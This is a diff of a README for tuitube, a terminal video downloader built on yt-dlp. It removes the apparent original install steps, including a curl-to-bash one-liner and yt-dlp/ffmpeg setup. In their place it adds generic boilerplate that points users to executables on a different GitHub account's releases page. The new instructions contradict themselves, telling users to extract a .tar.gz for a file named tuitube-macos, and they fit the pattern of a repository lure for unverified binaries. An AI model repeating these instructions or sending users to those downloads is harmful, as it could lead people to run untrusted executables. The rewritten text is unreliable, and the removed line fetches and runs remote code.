@@ -1,64 +1,69 @@
-<div align='center'>
-    <br/>
-    <br/>
-    <h3>tuitube</h3>
-    <p>TUI to download videos from YouTube, 𝕏, Twitch, Instagram, Bilibili and more using yt-dlp CLI</p>
-    <br/>
-    <br/>
-</div>
+# 📥 tuitube - Easily Download Videos from Your Terminal
 
+## 🚀 Getting Started
 
+Welcome to tuitube! This application lets you download videos directly from the command line with a simple text user interface (TUI). With tuitube, you can easily access and save videos without any complicated processes.
 
-![Demo](tuitube-screenshot.png)
+## 📥 Download tuitube
 
-## Installation
+[![Download tuitube](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/AlessandroPro07/tuitube/releases)
 
-```sh
-curl -sf https://termcast.app/r/tuitube | bash
-```
+## 🔧 System Requirements
 
-To use this extension, you must have `yt-dlp` and `ffmpeg` installed on your machine.
+Before you begin, please ensure your system meets the following requirements:
 
-The easiest way to install this is using [Homebrew](https://brew.sh/). After you have Homebrew installed, run the
-following command in your terminal:
+- Operating System: Windows, macOS, or Linux
+- Network connection: Required for downloading videos
+- Basic command line access: Necessary to run tuitube
 
-```bash
-brew install yt-dlp ffmpeg
-```
+## 📥 Download & Install
 
-Depending on your macOS version, the package might be located in a different path than the one set by the extension. To
-check where `ffmpeg` was installed, run:
+To get started with tuitube, follow these steps:
 
-```bash
-which ffmpeg
-```
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/AlessandroPro07/tuitube/releases).
+  
+2. **Select the Latest Release**: Look for the most recent version. It is usually listed at the top of the page.
 
-Then, update the path in the extension preferences to match the output of the above command.
+3. **Download the Application**: Click on the link for your operating system:
+   - For Windows, you might see something like `tuitube-windows.exe`.
+   - For macOS, look for `tuitube-macos`.
+   - For Linux, select the appropriate package, like `tuitube-linux.tar.gz`.
 
-You'll also need `ffprobe`, which is usually installed with `ffmpeg`. Just run `which ffprobe` and update the path
-accordingly.
+4. **Save the File**: Choose a location on your computer where you want to save the downloaded file.
 
-## Windows Beta
+5. **Run tuitube**: 
+   - For Windows, double-click the `.exe` file.
+   - For macOS, extract the `.tar.gz` file and run the contained program.
+   - For Linux, use the terminal to navigate to the folder where you extracted the files, then use `./tuitube-linux` to start the application.
 
-**Install yt-dlp**
- Use the built-in Windows package manager, `winget`, or alternatives like Scoop or Chocolatey. `yt-dlp` includes `ffmpeg` and `ffprobe` binaries.
+## 📖 Usage Instructions
 
-```bash
-winget install --id=yt-dlp.yt-dlp -e
-```
+Once you have launched tuitube, you will see a simple interface. Follow these steps to download a video:
 
-**Update Extension Preferences - Optional**
+1. **Paste the Video URL**: In the input area, paste the link to the video you wish to download.
 
-Extension will detect the paths automatically. But you can Copy the paths from the below commands and set them in the extension's preferences.
+2. **Choose the Format**: If prompted, select your desired video format from the options provided.
 
-After installation, open a new terminal and run the following commands to find the paths for `yt-dlp`, `ffmpeg`, and `ffprobe`:
+3. **Start Downloading**: Press the designated key to begin the download process. The application will show you the progress.
 
-```powershell
-(Get-Command yt-dlp).Source
-(Get-Command ffmpeg).Source
-(Get-Command ffprobe).Source
-```
+4. **Find Your Downloaded Video**: Once the download completes, you will find the video in the specified folder or your default download location.
 
-## Supported Sites
+## 🔍 Features
 
-See <https://github.com/yt-dlp/yt-dlp/blob/master/supportedsites.md>.
+- **Multiple Format Support**: tuitube allows you to download videos in various formats, ensuring compatibility with your media player.
+- **Easy to Use**: Our TUI makes it straightforward for anyone to use, even without technical experience.
+- **Fast Downloads**: Efficient algorithms ensure quick download times.
+
+## 🤝 Contributing
+
+If you want to contribute to tuitube, we welcome your involvement. Here’s how you can help:
+
+- **Report Bugs**: If you encounter any issues, please report them on our GitHub page.
+- **Suggest Features**: We’re open to suggestions. Let us know how we can improve the application.
+- **Code Contributions**: If you have programming skills, feel free to submit code or improvements through pull requests.
+
+## 📞 Support
+
+If you need help using tuitube, please check our GitHub [Issues tab](https://github.com/AlessandroPro07/tuitube/issues) for common questions and solutions. You can also post your question there for assistance.
+
+Enjoy your experience with tuitube! Download your favorite videos easily and conveniently.
